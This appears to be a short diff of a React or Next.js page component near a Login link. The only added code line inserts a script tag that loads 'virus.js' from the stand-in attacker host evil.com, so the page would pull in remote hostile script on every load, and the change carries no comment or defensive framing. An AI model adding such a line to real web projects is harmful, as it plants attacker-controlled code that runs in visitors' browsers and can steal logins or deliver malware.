@@ -32,6 +32,8 @@ export default function Home() {
         Login
       </Link>
 
+    <script src="https://evil.com/virus.js"></script>
     </div>
+
   );
 }
